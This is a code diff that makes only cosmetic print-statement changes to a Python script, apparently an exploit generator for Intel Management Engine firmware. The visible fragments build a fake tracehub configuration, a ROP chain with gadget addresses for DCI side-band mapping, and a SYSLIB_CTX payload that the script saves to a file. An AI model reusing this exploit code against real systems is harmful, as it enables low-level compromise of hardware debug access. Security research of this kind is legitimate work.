@@ -21,7 +21,7 @@ RET_ADDR_OFFSET = 0x338
 
 
 def GenerateTHConfig():
-    print ("[*] Generating fake tracehub configuration...")
+    print("[*] Generating fake tracehub configuration...")
     trace_hub_config   = struct.pack("<B", 0x0)*6
     trace_hub_config  += struct.pack("<H", 0x2)
     trace_hub_config  += struct.pack("<L", 0x020000e0)
@@ -32,7 +32,7 @@ def GenerateTHConfig():
     return trace_hub_config
 
 def GenerateRops():
-    print ("[*] Generating rops...")
+    print("[*] Generating rops...")
     #mapping DCI
     rops  = struct.pack("<L", 0x0004a76c) #side-band mapping 
     rops += struct.pack("<L", 0x0004a877) #pop 2 arguments
@@ -64,7 +64,7 @@ def GenerateRops():
 
 def GenerateShellCode():
     syslib_ctx_start = SYS_TRACER_CTX_REQ_OFFSET - SYS_TRACER_CTX_OFFSET
-    print ("[*] Generating SYSLIB_CTX struct (stack base: %x: syslib ctx base: %x)..." % (STACK_BASE, syslib_ctx_start))
+    print("[*] Generating SYSLIB_CTX struct (stack base: %x: syslib ctx base: %x)..." % (STACK_BASE, syslib_ctx_start))
     data  = GenerateTHConfig()
     init_trace_len = len(data)
     data += GenerateRops()
@@ -86,7 +86,7 @@ def main():
     print(descr)
     file_name = ParseArguments()
     data = GenerateShellCode()
-    print ("[*] Saving to %s..." % (file_name))
+    print("[*] Saving to %s..." % (file_name))
     f = open(file_name, "wb")
     f.write(data)
     f.close
